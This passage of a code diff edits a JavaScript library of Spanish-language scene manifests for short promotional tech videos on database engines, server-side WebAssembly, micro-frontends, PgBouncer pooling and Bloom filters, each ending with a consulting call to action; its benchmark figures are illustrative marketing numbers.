     "group": "14. LSM TREES VS BTREES",
     "label": "Var B (Polémico): ¿Por qué tu base colapsa en escrituras masivas? Postgres vs RocksDB",
     "variation": "B (Polémico)",
-    "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
+    "category": "ESTRUCTURAS DE DATOS & DB INTERNALS",
     "manifest": {
       "title": "[14] ¿Por qué tu base colapsa en escrituras masivas? Postgres vs RocksDB (Var B)",
-      "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
+      "category": "ESTRUCTURAS DE DATOS & DB INTERNALS",
       "slug": "14_lsm_trees_vs_btrees",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "iops_split_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Estás bombardeando PostgreSQL con eventos de analítica y tu disco colapsó por contención de páginas de B-Trees.",
-          "visual_cue": "Apertura directa con terminal mostrando saturación de IOPS al 100% en disco",
+          "id": "lsm_shock",
+          "type": "storage_engine_viz",
+          "duration": 6,
+          "voiceover": "Postgres es fantástico para consultas complejas, pero cuando le lanzas cincuenta mil inserts por segundo el I/O del disco explota.",
+          "visual_cue": "Visualizador del motor LSM demostrando cómo las escrituras se ordenan en RAM antes de tocar el SSD",
           "props": {
-            "header": "TELEMETRÍA DE DISCO",
-            "title": "SATURACIÓN DE IOPS EN NVME",
-            "termA": {
-              "title": "POSTGRESQL INSERT MASIVO",
-              "color": "#ef4444",
-              "cmd": "iostat -xz 1",
-              "status": "Disco al 99.8% de utilización · I/O Wait",
-              "time": "Saturado",
-              "lines": [
-                "B-Tree lock contention en páginas de índices",
-                "WAL flush bottleneck bloqueando hilos de workers",
-                "Peticiones HTTP cayendo con error 504 Gateway Timeout"
-              ]
-            },
-            "termB": {
-              "title": "LSM / COLUMNAR ENGINE",
-              "color": "#10b981",
-              "cmd": "ingest_worker --batch=10000",
-              "status": "Escrituras secuenciales sin bloqueos",
-              "time": "Fluido",
-              "lines": [
-                "MemTable absorbe ráfagas de 150,000 req/s",
-                "Utilización de disco por debajo del 25%",
-                "Latencia de inserción estable en sub-milisegundos"
-              ]
-            }
+            "mode": "lsm",
+            "badge": "INGENIERÍA DE ALMACENAMIENTO",
+            "title": "ROCKSDB VS POSTGRESQL",
+            "subtitle": "ESCRIBE EN RAM PRIMERO · MERGE ORDENADO EN DISCO"
           }
         },
         {
-          "id": "cta_lsm_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la arquitectura de datos de tu producto para seleccionar el motor adecuado y evitar caídas en picos de tráfico. Enlace en mi bio.",
-          "visual_cue": "Cierre con auditoría de datos",
+          "id": "terminal_split_storage",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Bases de datos basadas en LSM como Cassandra o RocksDB son la respuesta para telemetría y logs. Link en mi perfil para auditar tu almacenamiento.",
+          "visual_cue": "Terminal comparando throughput de escrituras y llamada a la acción en bio",
           "props": {
-            "header": "AUDITORÍA DE PERSISTENCIA Y LATENCIA",
-            "title": "DISEÑO DE CAPA DE DATOS PARA ALTA CARGA",
-            "cta": {
-              "badge": "AUDITORÍA DE DATOS (Link en perfil)",
-              "text": "Evita caídas por saturación de base de datos. Agenda tu auditoría técnica en mi perfil."
-            }
+            "header": "AUDITORÍA DE BASES DE DATOS (Link en bio)",
+            "title": "OPTIMIZACIÓN DE ESCRITURA",
+            "leftTitle": "POSTGRES B-TREE",
+            "rightTitle": "ROCKSDB LSM-TREE",
+            "leftText": "Throughput: 4.800 inserts/seg\nI/O Wait: 42% de saturación en NVMe\nColapso por bloqueo de páginas",
+            "rightText": "Throughput: 84.000 inserts/seg\nI/O Wait: 2% (Escritura secuencial)\nCero sobrecarga de actualización"
           }
         }
       ]
@@ -2692,74 +2297,51 @@ window.__BIBLIOTECA_2026__ = [
     "group": "15. WEBASSEMBLY SERVIDOR",
     "label": "Var A (Técnico): Sandboxing matemático: Wasmtime y aislamiento de código",
     "variation": "A (Técnico)",
-    "category": "RUNTIMES DE SERVIDOR & WASM",
+    "category": "COMPILACIÓN & RUNTIMES",
     "manifest": {
       "title": "[15] Sandboxing matemático: Wasmtime y aislamiento de código (Var A)",
-      "category": "RUNTIMES DE SERVIDOR & WASM",
+      "category": "COMPILACIÓN & RUNTIMES",
       "slug": "15_webassembly_servidor",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "wasm_speed_hook",
-          "type": "metrics_comparison",
-          "duration": 6.5,
-          "voiceover": "¿Cómo ejecutar código no confiable de usuarios a velocidad nativa sin riesgo de seguridad? Mientras un contenedor Docker tarda cientos de milisegundos en arrancar, una función WASM se inicializa en menos de un milisegundo.",
-          "visual_cue": "Apertura directa con comparativa de cold start entre Docker y WebAssembly",
-          "props": {
-            "header": "COLD START EN EDGE COMPUTING",
-            "metricA": {
-              "label": "CONTENEDOR DOCKER LIGHT",
-              "value": "450ms",
-              "sub": "Namespace init y OverlayFS mount",
-              "color": "#ef4444"
-            },
-            "metricB": {
-              "label": "WASM MICRO-RUNTIME",
-              "value": "0.8ms",
-              "sub": "Instanciación de memoria directa",
-              "color": "#10b981"
-            }
-          }
-        },
-        {
-          "id": "wasm_memory",
-          "type": "memory_layout",
+          "id": "kernel_wasm_lead",
+          "type": "kernel_sandbox_viz",
           "duration": 6,
-          "voiceover": "Un módulo WASI tiene una memoria lineal estrictamente delimitada. El programa no puede leer ni escribir ni un solo byte fuera de su espacio asignado.",
-          "visual_cue": "Memoria lineal delimitada de WebAssembly",
+          "voiceover": "WebAssembly ya no es solo para el navegador. En el servidor ofrece un aislamiento de código tan seguro como Docker pero arrancando en un milisegundo.",
+          "visual_cue": "Visualizador del sandbox de memoria lineal Wasmtime aislando código de terceros",
           "props": {
-            "header": "AISLAMIENTO MATEMÁTICO",
-            "title": "MEMORIA LINEAL ENCAPSULADA",
-            "items": [
-              {
-                "name": "ESPACIO DEL MÓDULO WASM",
-                "addr": "0x0000 -> 0xFFFF",
-                "value": "Memoria lineal aislada sin acceso a syscalls",
-                "color": "#10b981"
-              },
-              {
-                "name": "MEMORIA DEL KERNEL HOST",
-                "addr": "BLOQUEADA",
-                "value": "Protegida con guard pages por hardware",
-                "color": "#ef4444"
-              }
-            ]
+            "badge": "SANDBOXING MATEMÁTICO",
+            "title": "WASMTIME: AISLAMIENTO FORMAL",
+            "subtitle": "MEMORIA LINEAL AISLADA SIN CONTENEDORES PESADOS"
           }
         },
         {
-          "id": "cta_wasm",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Diseño arquitecturas seguras de ejecución de código y micro-runtimes aislados. Si necesitas un ingeniero especializado para tu sistema, link en mi bio.",
-          "visual_cue": "Cierre con contratación senior",
+          "id": "latency_wasm",
+          "type": "latency_scale",
+          "duration": 5.5,
+          "voiceover": "Un contenedor Docker tarda ochocientos milisegundos en arrancar y consume cien megabytes de base. Un módulo Wasm arranca en microsegundos usando dos megabytes.",
+          "visual_cue": "Escala de latencia comparando arranque de contenedor Docker vs módulo WebAssembly",
           "props": {
-            "header": "CONTRATACIÓN SENIOR / SISTEMAS",
-            "title": "ARQUITECTURA DE RUNTIMES & EDGE COMPUTING",
-            "cta": {
-              "badge": "STAFF ENGINEER (Link en bio)",
-              "text": "¿Necesitas ejecutar plugins o código aislado de forma segura? Hablemos en mi perfil."
-            }
+            "header": "MÉTRICAS DE ARRANQUE EN FRÍO",
+            "title": "DOCKER VS WEBASSEMBLY EN SERVIDOR",
+            "subtitle": "TIEMPO DE INICIALIZACIÓN DE INSTANCIA"
+          }
+        },
+        {
+          "id": "terminal_wasm",
+          "type": "terminal_split",
+          "duration": 6,
+          "voiceover": "Ideal para plugins de usuarios y funciones serverless ultrarrápidas en el Edge. Link en bio si quieres diseñar arquitecturas seguras con WebAssembly.",
+          "visual_cue": "Terminal ejecutando wasmtime con permisos acotados mediante WASI y llamada a la acción en bio",
+          "props": {
+            "header": "CONSULTORÍA EN WASM (Link en bio)",
+            "title": "COMPUTACIÓN SEGURA EN EL EDGE",
+            "leftTitle": "WASMTIME CLI",
+            "rightTitle": "BENEFICIOS DE SEGURIDAD",
+            "leftText": "$ wasmtime run --dir=/tmp plugin.wasm\n✔ Memoria lineal limitada a 16 MB\n✔ Sin acceso a red ni disco no autorizado\n✔ Tiempo de ejecución: 1.2 ms",
+            "rightText": "• Permite ejecutar código de clientes sin riesgo\n• 100x más ligero que máquinas virtuales\n• Apto para arquitectura Edge y Serverless\n• Asesoría técnica: enlace en perfil"
           }
         }
       ]
@@ -2771,60 +2353,36 @@ window.__BIBLIOTECA_2026__ = [
     "group": "15. WEBASSEMBLY SERVIDOR",
     "label": "Var B (Polémico): ¿Morirá Docker en el Edge? Arranques en 1 milisegundo con WASM",
     "variation": "B (Polémico)",
-    "category": "RUNTIMES DE SERVIDOR & WASM",
+    "category": "COMPILACIÓN & RUNTIMES",
     "manifest": {
       "title": "[15] ¿Morirá Docker en el Edge? Arranques en 1 milisegundo con WASM (Var B)",
-      "category": "RUNTIMES DE SERVIDOR & WASM",
+      "category": "COMPILACIÓN & RUNTIMES",
       "slug": "15_webassembly_servidor",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "docker_tradeoff_hook",
-          "type": "tradeoff_matrix",
-          "duration": 6.5,
-          "voiceover": "El creador de Docker dijo que si WASM hubiera existido en 2008, no habrían tenido que crear Docker. Para funciones serverless en el edge, WASM es infinitamente superior.",
-          "visual_cue": "Apertura directa con matriz comparativa Docker frente a WebAssembly",
+          "id": "cold_start_shock",
+          "type": "latency_scale",
+          "duration": 5.5,
+          "voiceover": "El arranque en frío de los contenedores Docker está destruyendo la experiencia de usuario en arquitecturas serverless.",
+          "visual_cue": "Gráfica de escala de latencia mostrando el cold start de Docker vs Wasm",
           "props": {
-            "header": "COMPARATIVA DE CONTENCIÓN",
-            "title": "DOCKER CONTAINERS VS WEBASSEMBLY",
-            "colA": "WEBASSEMBLY (WASI)",
-            "colB": "DOCKER (OCI)",
-            "rows": [
-              {
-                "dim": "Tiempo de arranque en frío",
-                "a": "✔ < 1 milisegundo",
-                "b": "✖ 300-800 milisegundos",
-                "aGood": true
-              },
-              {
-                "dim": "Tamaño del binario",
-                "a": "✔ 2 a 10 Megabytes",
-                "b": "✖ 150 a 500 Megabytes",
-                "aGood": true
-              },
-              {
-                "dim": "Soporte de apps monolíticas",
-                "a": "✖ Requiere compilar a WASI",
-                "b": "✔ Cualquier Linux binario",
-                "aGood": false
-              }
-            ]
+            "header": "COLD START EN SERVERLESS",
+            "title": "EL COSTE OCULTO DE LOS CONTENEDORES",
+            "subtitle": "ARRANQUE DE KERNEL VS INSTANCIACIÓN DE MEMORIA"
           }
         },
         {
-          "id": "cta_wasm_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Asesoro a empresas en modernización de infraestructura serverless y diseño de sandboxes seguros. Contacto en mi biografía.",
-          "visual_cue": "Cierre con consultoría de infraestructura",
+          "id": "kernel_diagram_wasm",
+          "type": "kernel_sandbox_viz",
+          "duration": 6,
+          "voiceover": "Con WebAssembly y WASI compilas código en Rust o Go que corre en cualquier servidor a velocidad nativa sin el peso de un sistema operativo virtual. Link en bio.",
+          "visual_cue": "Visualizador del aislamiento en servidor mediante Wasmtime",
           "props": {
-            "header": "CONSULTORÍA DE INFRAESTRUCTURA",
-            "title": "ARQUITECTURA SERVERLESS MODERNA",
-            "cta": {
-              "badge": "CONSULTORÍA TÉCNICA (Link en perfil)",
-              "text": "¿Interesado en WASM o arquitecturas Edge? Link en mi perfil para agendar tu sesión."
-            }
+            "badge": "EL FUTURO DEL EDGE",
+            "title": "EJECUCIÓN DE CERO SOBRECARGA",
+            "subtitle": "WASI: INTERFAZ DE SISTEMA OPERATIVO UNIVERSAL"
           }
         }
       ]
@@ -2845,78 +2403,59 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "vitals_hook",
-          "type": "metrics_comparison",
+          "id": "dep_tree_hook",
+          "type": "tree_hierarchy",
           "duration": 6.5,
           "voiceover": "¿Por qué tantas empresas están desmantelando sus micro-frontends para volver a un monorepo unificado? Porque descargar múltiples versiones de frameworks destruyó la velocidad de carga.",
-          "visual_cue": "Apertura directa con comparativa de Core Web Vitals: Micro-frontends frente a Monorepo limpio",
+          "visual_cue": "Visualizador de árbol de dependencias duplicadas compitiendo en el navegador",
           "props": {
-            "header": "IMPACTO EN CORE WEB VITALS",
-            "metricA": {
-              "label": "MICRO-FRONTENDS FEDERATION",
-              "value": "3.4s LCP",
-              "sub": "Puntaje de Performance: 42/100",
-              "color": "#ef4444"
-            },
-            "metricB": {
-              "label": "MONOREPO UNIFICADO",
-              "value": "0.6s LCP",
-              "sub": "Puntaje de Performance: 98/100",
-              "color": "#10b981"
-            }
-          }
-        },
-        {
-          "id": "bundle_waterfall",
-          "type": "network_pipeline",
-          "duration": 6.5,
-          "voiceover": "Cada micro-frontend descarga su propia copia de librerías, provocando descargas de múltiples versiones de React y waterfalls de red inmanejables.",
-          "visual_cue": "Pipeline visual mostrando la cascada de scripts y dependencias duplicadas",
-          "props": {
-            "header": "WATERFALL DE DESCARGA",
-            "title": "FRAGMENTACIÓN DE DEPENDENCIAS",
-            "subtitle": "TRIPLE CARGA DE FRAMEWORKS EN EL NAVEGADOR",
-            "stages": [
+            "badge": "FRAGMENTACIÓN DE RUNTIMES",
+            "title": "EXPLOSIÓN DE DEPENDENCIAS MFE",
+            "items": [
               {
-                "id": "app1",
-                "label": "HEADER MFE (REACT 18.2)",
-                "sub": "Descarga 140KB de runtime inicial",
-                "y": 220,
-                "color": "#ef4444",
-                "metric": "180ms"
+                "name": "App Shell (Host)",
+                "level": 0
               },
               {
-                "id": "app2",
-                "label": "CHECKOUT MFE (REACT 19.0)",
-                "sub": "Descarga 160KB duplicados por conflicto",
-                "y": 520,
-                "color": "#fbbf24",
-                "metric": "290ms"
+                "name": "Header MFE (React 18.2)",
+                "level": 1
               },
               {
-                "id": "app3",
-                "label": "FOOTER MFE (VUE 3)",
-                "sub": "Tercer framework compitiendo en hilo principal",
-                "y": 820,
-                "color": "#38bdf8",
-                "metric": "420ms"
+                "name": "Checkout MFE (React 19.0 Duplicado)",
+                "level": 1
+              },
+              {
+                "name": "Catalog MFE (Vue 3 en Iframe)",
+                "level": 1
               }
             ]
           }
         },
         {
-          "id": "cta_mf",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la arquitectura frontend y optimizo Core Web Vitals para aplicaciones complejas. Link en mi perfil para agendar una sesión técnica.",
-          "visual_cue": "Cierre con llamado a auditoría de arquitectura frontend",
+          "id": "stepper_consolidation",
+          "type": "migration_stepper_viz",
+          "duration": 6,
+          "voiceover": "Cada micro-frontend descarga su propio runtime. La solución moderna es consolidar en un monorepo con Turborepo manteniendo aislamiento por paquetes de código.",
+          "visual_cue": "Visualizador de fases de consolidación hacia monorepo unificado",
           "props": {
-            "header": "AUDITORÍA DE ARQUITECTURA FRONTEND",
-            "title": "RECUPERA LA VELOCIDAD DE TU APLICACIÓN",
-            "cta": {
-              "badge": "AUDITORÍA DE RENDIMIENTO WEB (Link en bio)",
-              "text": "¿Tu aplicación web está pesada y fragmentada? Link en mi perfil para auditarla."
-            }
+            "badge": "CONSOLIDACIÓN ARQUITECTÓNICA",
+            "title": "RETORNO AL MONOREPO LIMPIO",
+            "subtitle": "TURBOREPO + ARQUITECTURA DE COMPONENTES COMPARTIDOS"
+          }
+        },
+        {
+          "id": "cta_mf",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Audito la arquitectura frontend y optimizo Core Web Vitals para aplicaciones complejas. Link en mi perfil para agendar una sesión técnica.",
+          "visual_cue": "Terminal con análisis de bundle y llamada a la acción en bio",
+          "props": {
+            "header": "AUDITORÍA FRONTEND (Link en bio)",
+            "title": "OPTIMIZACIÓN DE CORE WEB VITALS",
+            "leftTitle": "ANÁLISIS DE BUNDLE",
+            "rightTitle": "MÉTRICAS CLAVE",
+            "leftText": "$ npx bundlesize-audit\n✔ Bundle unificado: 180 KB (Gzipped)\n✔ LCP reducido de 3.8s a 0.7s\n✔ Eliminadas 4 versiones duplicadas de React",
+            "rightText": "• Aumenta la conversión de checkout\n• Cero conflictos de CSS global\n• Despliegues seguros con tipado estricto\n• Agenda sesión: enlace en el perfil"
           }
         }
       ]
@@ -2937,73 +2476,49 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "mfe_impact_hook",
-          "type": "kinetic_hook",
-          "duration": 4.5,
-          "voiceover": "Adoptaste micro-frontends porque estaba de moda y ahora tienes un infierno de estilos rotos, dependencias cruzadas y aplicaciones lentas.",
-          "visual_cue": "Tipografía de impacto gigante sin iconos genéricos",
+          "id": "metrics_bundle_shock",
+          "type": "metrics_comparison",
+          "duration": 6,
+          "voiceover": "Adoptaste micro-frontends porque estaba de moda y ahora tu usuario tiene que descargar ocho megabytes de JavaScript para ver una simple tienda online.",
+          "visual_cue": "Comparativa de peso de bundle: Micro-frontends fragmentados vs Monorepo unificado",
           "props": {
-            "layout": "impact",
-            "badge": "LECCIONES DE INDUSTRIA",
-            "lines": [
-              {
-                "text": "DESMANTELANDO LOS",
-                "color": "#ef4444"
-              },
-              {
-                "text": "MICRO-FRONTENDS",
-                "color": "#ffffff"
-              }
-            ],
-            "subtitle": "El regreso al monorepo limpio con arquitectura de islas"
+            "header": "PESO TOTAL DE JAVASCRIPT",
+            "metricA": {
+              "label": "MICRO-FRONTENDS FEDERATION",
+              "value": "8.4 MB",
+              "sub": "Múltiples runtimes compitiendo en CPU",
+              "color": "#ef4444"
+            },
+            "metricB": {
+              "label": "MONOREPO OPTIMIZADO",
+              "value": "320 KB",
+              "sub": "Tree-shaking estricto en un solo bundle",
+              "color": "#10b981"
+            }
           }
         },
         {
-          "id": "tradeoff_mfe",
-          "type": "tradeoff_matrix",
-          "duration": 6,
-          "voiceover": "Los monorepos modernos con herramientas como Turborepo o Nx permiten que múltiples equipos trabajen sin destruir la experiencia del usuario final.",
-          "visual_cue": "Matriz comparativa Micro-frontends vs Monorepo moderno",
+          "id": "stepper_mfe",
+          "type": "migration_stepper_viz",
+          "duration": 5.5,
+          "voiceover": "Los monorepos modernos permiten que múltiples equipos trabajen de forma independiente sin destruir la experiencia del usuario final.",
+          "visual_cue": "Visualizador de migración hacia monorepo modular",
           "props": {
-            "header": "ORGANIZACIÓN VS EXPERIENCIA DE USUARIO",
-            "title": "MICRO-FRONTENDS VS MONOREPO MODERNO",
-            "colA": "MONOREPO CON TURBOREPO",
-            "colB": "MICRO-FRONTENDS (IFRAMES/MFE)",
-            "rows": [
-              {
-                "dim": "Experiencia de Usuario (LCP)",
-                "a": "✔ Rápida y unificada",
-                "b": "✖ Lenta y fragmentada",
-                "aGood": true
-              },
-              {
-                "dim": "Consistencia de Diseño (CSS)",
-                "a": "✔ Sistema de diseño único",
-                "b": "✖ Conflictos de estilos globales",
-                "aGood": true
-              },
-              {
-                "dim": "Mantenimiento de Dependencias",
-                "a": "✔ 1 solo lockfile auditado",
-                "b": "✖ 8 package.json desfasados",
-                "aGood": true
-              }
-            ]
+            "badge": "SIMPLICIDAD ORGANIZATIVA",
+            "title": "MIGRACIÓN HACIA MONOREPO",
+            "subtitle": "ELIMINA IFRAMES Y REDUCE EL TIEMPO DE CARGA"
           }
         },
         {
           "id": "cta_mf_b",
           "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Ayudo a empresas a consolidar arquitecturas frontend fragmentadas en monorepos de alto rendimiento. Escríbeme o agenda en mi perfil.",
-          "visual_cue": "Cierre con auditoría de arquitectura frontend",
+          "duration": 4,
+          "voiceover": "Si tu aplicación web está pesada y fragmentada, link en mi perfil para auditarla y devolverle la velocidad.",
+          "visual_cue": "Matriz comparativa final y enlace en bio",
           "props": {
-            "header": "CONSOLIDACIÓN DE CODEBASE FRONTEND",
-            "title": "SIMPLIFICA TUS PROCESOS DE ENTREGA",
-            "cta": {
-              "badge": "CONSULTORÍA FRONTEND (Contacto en perfil)",
-              "text": "Consolida tus micro-frontends en un monorepo limpio. Link en mi perfil."
-            }
+            "header": "CONSULTORÍA DE RENDIMIENTO",
+            "title": "ARQUITECTURAS WEB RÁPIDAS",
+            "subtitle": "LINK EN BIO PARA AUDITAR TU APLICACIÓN"
           }
         }
       ]
@@ -3024,77 +2539,42 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "fork_memory_hook",
-          "type": "memory_layout",
+          "id": "conn_pool_hook",
+          "type": "connection_pool_viz",
           "duration": 6.5,
-          "voiceover": "¿Por qué conectar mil clientes directos a PostgreSQL satura tu servidor aunque no hagan consultas? Porque Postgres crea un proceso independiente de diez megabytes por cada conexión.",
-          "visual_cue": "Apertura directa con layout de memoria mostrando backend processes compitiendo por CPU y RAM",
+          "voiceover": "Cada vez que tu backend abre una conexión nueva a PostgreSQL, el kernel de Linux ejecuta un fork de diez megabytes. Con mil clientes, tu servidor colapsa por memoria.",
+          "visual_cue": "Visualizador de 1.000 streams de clientes entrando a PgBouncer y multiplexándose en 20 workers",
           "props": {
-            "header": "ARQUITECTURA DE PROCESOS",
-            "title": "POSTMASTER Y BACKEND WORKERS",
-            "items": [
-              {
-                "name": "1000 CONEXIONES DIRECTAS",
-                "addr": "1000 PROCESOS FORK()",
-                "value": "10GB RAM consumidos solo en sockets",
-                "color": "#ef4444"
-              },
-              {
-                "name": "CAMBIO DE CONTEXTO EN KERNEL",
-                "addr": "CONTEXT SWITCH OVERHEAD",
-                "value": "La CPU gasta 60% solo cambiando de tarea",
-                "color": "#f59e0b"
-              }
-            ]
+            "badge": "MULTIPLEXACIÓN DE CLIENTES",
+            "title": "EL COSTE DE UN FORK() EN LINUX",
+            "subtitle": "1.000 CONEXIONES ENTRANTES => 20 BACKEND PROCESSES"
           }
         },
         {
-          "id": "pgbouncer_pool",
-          "type": "architecture_flow",
-          "duration": 6.5,
-          "voiceover": "PgBouncer actúa como un embudo inteligente. Mantiene solo veinte conexiones reales con la base y atiende a miles de clientes en modo transaccional.",
-          "visual_cue": "Diagrama de flujo: 10,000 conexiones de clientes pasando por PgBouncer a 20 conexiones reales de Postgres",
+          "id": "latency_fork",
+          "type": "latency_scale",
+          "duration": 6,
+          "voiceover": "El proceso de crear una conexión toma quince milisegundos de handshake y context switching. Con PgBouncer, la conexión ya está viva y responde en microsegundos.",
+          "visual_cue": "Escala de latencia comparando tiempo de creación de proceso fork vs pool de conexiones",
           "props": {
-            "header": "CONNECTION POOLING EFICIENTE",
-            "title": "EMBUDO TRANSACCIONAL CON PGBOUNCER",
-            "nodes": [
-              {
-                "id": "clients",
-                "label": "10,000 CONEXIONES ACTIVAS",
-                "sublabel": "Servidores web y workers concurrentes",
-                "color": "#38bdf8",
-                "y": 160
-              },
-              {
-                "id": "pooler",
-                "label": "PGBOUNCER (TRANSACTION MODE)",
-                "sublabel": "Multiplexa peticiones en un micro-proceso en C",
-                "color": "#fbbf24",
-                "y": 520
-              },
-              {
-                "id": "db",
-                "label": "POSTGRES (20 POOL WORKERS)",
-                "sublabel": "100% de la CPU dedicada a ejecutar queries reales",
-                "color": "#10b981",
-                "y": 880
-              }
-            ]
+            "header": "TIEMPO DE ESTABLECIMIENTO DE CONEXIÓN",
+            "title": "FORK EN LINUX VS POOL REUTILIZADO",
+            "subtitle": "HANDSHAKE COMPLETO VS TRANSACCIÓN DIRECTA"
           }
         },
         {
-          "id": "cta_pgb",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Si tu base de datos sufre picos de latencia o agota su pool de conexiones en momentos críticos, audito tu infraestructura de datos. Link en mi perfil.",
-          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
+          "id": "cta_pgbouncer",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Configuro clústeres de PgBouncer y optimizo la concurrencia de bases de datos para soportar alto tráfico. Link en mi perfil para agendar una auditoría técnica.",
+          "visual_cue": "Terminal mostrando pgbench con saturación neutralizada y llamada a la acción en bio",
           "props": {
-            "header": "AUDITORÍA DE RENDIMIENTO DE BASES DE DATOS",
-            "title": "OPTIMIZA TUS POOLS DE CONEXIÓN",
-            "cta": {
-              "badge": "AUDITORÍA DE DATOS (Link en bio)",
-              "text": "¿Problemas con max_connections en Postgres? Link en mi bio para agendar una auditoría técnica."
-            }
+            "header": "AUDITORÍA DE BASES DE DATOS (Link en bio)",
+            "title": "CONCURRENCIA SIN SOBRECARGA",
+            "leftTitle": "BENCHMARK PGBENCH",
+            "rightTitle": "MÉTRICAS CLAVE",
+            "leftText": "$ pgbench -c 1000 -j 8 -T 10 app_db\n✔ Clientes concurrentes: 1.000 activos\n✔ Throughput: 18.400 TPS\n✔ Uso de RAM en Postgres: 210 MB estables",
+            "rightText": "• Reduce el 95% del uso de memoria en DB\n• Elimina errores de \"too many clients\"\n• Soporta picos masivos de tráfico\n• ¿Dudas con Postgres? Enlace en mi bio"
           }
         }
       ]
@@ -3115,52 +2595,36 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "fatal_pool_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Subiste el tamaño del servidor a una máquina de mil dólares y sigue lento. No necesitas más hardware: necesitas un pooler para evitar saturar conexiones.",
-          "visual_cue": "Apertura directa con terminal mostrando error fatal de max_connections frente a PgBouncer",
+          "id": "pool_collapse_hook",
+          "type": "connection_pool_viz",
+          "duration": 6,
+          "voiceover": "Tu backend en Node o Serverless abre conexiones a lo loco y cuando sube el tráfico tu base de datos se congela. El problema no son tus queries, es la saturación de conexiones.",
+          "visual_cue": "Visualizador de PgBouncer absorbiendo la sobrecarga de conexiones",
           "props": {
-            "header": "BENCHMARK DE CONEXIONES",
-            "title": "CONEXIÓN DIRECTA VS POOLING TRANSACCIONAL",
-            "termA": {
-              "title": "SIN POOLER (MAX_CONNECTIONS = 1000)",
-              "color": "#ef4444",
-              "cmd": "psql -c \"SELECT count(*) FROM pg_stat_activity;\"",
-              "status": "FATAL: remaining connection slots are reserved",
-              "time": "Caída de servicio",
-              "lines": [
-                "Memoria swap activada en servidor de Postgres",
-                "Pérdida de paquetes en cola de sockets",
-                "Latencia p99 disparada a 8.2 segundos"
-              ]
-            },
-            "termB": {
-              "title": "CON PGBOUNCER (POOL_SIZE = 25)",
-              "color": "#10b981",
-              "cmd": "pgbouncer -d /etc/pgbouncer.ini",
-              "status": "10,000 clientes atendidos sin error",
-              "time": "Estable 24/7",
-              "lines": [
-                "Uso de memoria constante y bajo",
-                "CPU al 40% ejecutando queries reales",
-                "Latencia p99 estable en 4 milisegundos"
-              ]
-            }
+            "badge": "ERROR COMÚN DE ESCALABILIDAD",
+            "title": "SATURACIÓN DE POOL EN SERVERLESS",
+            "subtitle": "PGBOUNCER NEUTRALIZANDO PICOS DE TRÁFICO"
           }
         },
         {
-          "id": "cta_pgb_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la configuración de PostgreSQL y resuelvo cuellos de botella de concurrencia y latencia p99. Agenda tu revisión en mi bio.",
-          "visual_cue": "Cierre con auditoría técnica de Postgres",
+          "id": "metrics_pool",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "Un servidor de base de datos con cuatro núcleos solo puede ejecutar cuatro queries simultáneamente en CPU. Tener quinientas conexiones abiertas solo causa contención.",
+          "visual_cue": "Comparativa de memoria consumida: 10 GB sin pool vs 200 MB con PgBouncer",
           "props": {
-            "header": "AUDITORÍA DE POSTGRESQL & ESCALABILIDAD",
-            "title": "RESOLUCIÓN DE CONGESTIÓN DE CONEXIONES",
-            "cta": {
-              "badge": "AUDITORÍA TÉCNICA (Link en perfil)",
-              "text": "Elimina cuellos de botella en tu base de datos. Enlace directo en mi perfil."
+            "header": "MEMORIA DESPERDICIADA EN CONEXIONES",
+            "metricA": {
+              "label": "CONEXIONES DIRECTAS (1.000)",
+              "value": "10.2 GB RAM",
+              "sub": "Sobrecarga de procesos en el kernel",
+              "color": "#ef4444"
+            },
+            "metricB": {
+              "label": "CON PGBOUNCER (20 WORKERS)",
+              "value": "240 MB RAM",
+              "sub": "Pool transaccional ultra eficiente",
+              "color": "#10b981"
             }
           }
         }
@@ -3173,71 +2637,67 @@ window.__BIBLIOTECA_2026__ = [
     "group": "18. BLOOM FILTERS PROBABILISTIC",
     "label": "Var A (Técnico): Bloom Filters: Cómo saber si un registro existe con 99% de certeza",
     "variation": "A (Técnico)",
-    "category": "ESTRUCTURAS DE DATOS & CACHÉ",
+    "category": "ESTRUCTURAS DE DATOS PROBABILÍSTICAS",
     "manifest": {
       "title": "[18] Bloom Filters: Cómo saber si un registro existe con 99% de certeza (Var A)",
-      "category": "ESTRUCTURAS DE DATOS & CACHÉ",
+      "category": "ESTRUCTURAS DE DATOS PROBABILÍSTICAS",
       "slug": "18_bloom_filters_probabilistic",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "bloom_math_hook",
-          "type": "memory_layout",
+          "id": "bloom_lead",
+          "type": "cache_flow_viz",
           "duration": 6.5,
-          "voiceover": "¿Cómo saber si un usuario ya leyó un post entre quinientos millones de registros usando solo tres bits de RAM? Con Bloom Filters probabilísticos.",
-          "visual_cue": "Apertura directa con array de bits encendiéndose por hashes SHA-256 y Murmur3",
+          "voiceover": "¿Cómo saber si un nombre de usuario ya está registrado entre quinientos millones de registros sin tocar el disco? Usando un filtro de Bloom en memoria.",
+          "visual_cue": "Visualizador de array de bits de Bloom Filter iluminando posiciones de hash",
           "props": {
-            "header": "MECANISMO DE HASHING",
